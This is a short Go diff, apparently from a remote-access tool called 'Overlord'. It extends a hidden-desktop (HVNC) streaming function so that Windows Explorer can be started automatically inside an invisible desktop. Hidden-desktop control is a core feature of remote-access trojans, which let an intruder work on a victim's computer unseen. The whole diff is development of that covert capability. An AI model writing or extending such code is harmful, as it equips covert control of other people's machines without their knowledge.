@@ -26,7 +26,7 @@ func GetPersistedHVNCDisplay() int {
 	return hvncPersistedDisplayValue
 }
 
-func HVNCStart(ctx context.Context, env *rt.Env) error {
+func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
 	interval, fps := streamInterval("OVERLORD_HVNC_MAX_FPS", 30)
 	capture.SetH264TargetFPS(fps)
 	log.Printf("hvnc: starting stream (max fps %d)", fps)
@@ -34,6 +34,14 @@ func HVNCStart(ctx context.Context, env *rt.Env) error {
 	if err := capture.InitializeHVNCDesktop(); err != nil {
 		log.Printf("hvnc: failed to initialize hidden desktop: %v", err)
 		return err
+	}
+
+	if autoStartExplorer {
+		go func() {
+			if err := capture.HVNCAutoStartExplorer(); err != nil {
+				log.Printf("hvnc: auto-start explorer error: %v", err)
+			}
+		}()
 	}
 
 	ticker := time.NewTicker(interval)
